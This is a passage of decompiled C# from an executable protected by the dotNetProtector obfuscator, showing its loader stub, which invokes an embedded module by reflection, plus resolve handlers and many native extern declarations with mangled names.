      Module data = (Module) AppDomain.CurrentDomain.GetData("PvLogiciels.dotNetProtector.embedded.netmodule");
      if ((object) data == null)
        return \u0082\u0099.\u0082\u008C(_param0);
      Type type = data.GetType("<dotNetProtector>");
      if ((object) type == null)
        return \u0082\u0099.\u0082\u008C(_param0);
      MethodBase method = (MethodBase) type.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
      if ((object) method == null)
        return \u0082\u0099.\u0082\u008C(_param0);
      object[] parameters = new object[1]
      {
        (object) _param0
      };
      return (int) method.Invoke((object) null, parameters);
    }

    internal static Assembly \u0081Ë(object _param0, ResolveEventArgs _param1)
    {
      string str = _param1.Name.Replace("\\", "");
      if (!str.StartsWith("PvLogiciels.dotNetProtector.Runtime"))
        return (Assembly) null;
      Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
      int index = 0;
      if (0 < assemblies.Length)
      {
        Assembly assembly;
        do
        {
          assembly = assemblies[index];
          if (!(assembly.FullName == str))
            ++index;
          else
            goto label_5;
        }
        while (index < assemblies.Length);
        goto label_6;
label_5:
        return assembly;
      }
label_6:
      return (Assembly) null;
    }

    internal static Module \u0082\u0080(object _param0, ResolveEventArgs _param1) => (Module) AppDomain.CurrentDomain.GetData("PvLogiciels.dotNetProtector.embedded.netmodule");

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0081Æ(string[] _param0)
    {
      PvLogiciels.dotNetProtector.Runtime.ExeInit(typeof (RuntimeInterop), IntPtr.Zero, 0);
      Assembly.GetExecutingAssembly().ModuleResolve += new ModuleResolveEventHandler(\u0082\u0099.\u0082\u0080);
      return \u0082\u0099.\u0082\u0086(_param0);
    }

    [STAThread]
    internal static int \u0081ö(string[] _param0)
    {
      \u0082\u0099.õ();
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0082\u0099.\u0081Ë);
      int num = \u0082\u0099.\u0081Æ(_param0);
      GC.Collect();
      GC.WaitForPendingFinalizers();
      \u0082\u0099.\u0082\u0093();
      return num;
    }

    internal static void \u0081ó()
    {
    }

    internal static int \u0081ñ() => 0;

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u0081ì();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081è([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081ä();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u00AF([In] uint obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081Ý([In] string obj0, [In] Exception obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081Ý([In] string obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081Ñ();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081Å([In] Exception obj0, [In] Exception obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u00B7([In] EventHandler obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void \u0081ª([In] __FnPtr<int (void*)> obj0, [In] void* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u00A2();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern int \u0081\u00A0();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u0099([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern int \u0081\u0094([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe º* \u0081\u0092([In] sbyte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int* \u0081\u008E();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u008C([In] uint obj0, [In] \u0087* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int* \u0081\u0087();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u0084(
      [In] int* obj0,
      [In] char*** obj1,
      [In] char*** obj2,
      [In] int obj3,
      [In] \u0082\u0098* obj4);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u0080([In] \u0087* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern void û([In] __FnPtr<int (\u0081Ø*)> obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0082\u0093();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern void õ();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void ò([In] int obj0, [In] void* obj1, [In] void* obj2, [In] void* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void ï([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* ê([In] byte* obj0, [In] void** obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void â([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u00A0();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe uint Ú([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int Ö([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int Ñ([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int Ì([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int È([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u00BF([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int µ([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u00AB([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void \u0081\u00F7([In] void* obj0, [In] int obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern int \u009E();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0098([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0093([In] void* obj0, [In] void* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u008A([In] void* obj0, [In] void* obj1, [In] int obj2, [In] void* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u0083([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u0081Ï([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0082\u008B([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0082\u0083(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] sbyte** obj3,
      [In] byte obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0082\u0083(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] int obj3,
      [In] int obj4,
      [In] long obj5,
      [In] sbyte** obj6,
      [In] byte obj7);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00BE([In] byte* obj0, [In] void* obj1, [In] void* obj2, [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00BE(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] int obj3,
      [In] int obj4,
      [In] long obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00B6(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] sbyte** obj5);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00B6(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] sbyte* obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081í([In] byte* obj0, [In] uint obj1, [In] ushort obj2, [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081í(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] sbyte* obj3,
      [In] sbyte** obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081ç([In] byte* obj0, [In] void* obj1, [In] sbyte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081ß([In] byte* obj0, [In] void* obj1, [In] sbyte* obj2, [In] byte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081Ú([In] byte* obj0, [In] sbyte* obj1, [In] uint* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081Ó([In] byte* obj0, [In] void* obj1, [In] uint obj2, [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081Ì([In] byte* obj0, [In] ulong obj1, [In] ulong obj2, [In] int* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081È([In] byte* obj0, [In] sbyte* obj1, [In] ulong obj2, [In] int* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void Î([In] byte* obj0, [In] sbyte* obj1, [In] sbyte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern int \u0081\u008A();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern int \u0081\u0083([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern void \u0081\u00B8();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00B3(
      [In] byte* obj0,
      [In] void* obj1,
      [In] int* obj2,
      [In] sbyte* obj3,
      [In] int obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe int \u0081\u00B3([In] byte* obj0, [In] void* obj1, [In] int obj2, [In] int obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    public static extern unsafe void* \u0081\u00B2([In] void* obj0);
  }
}
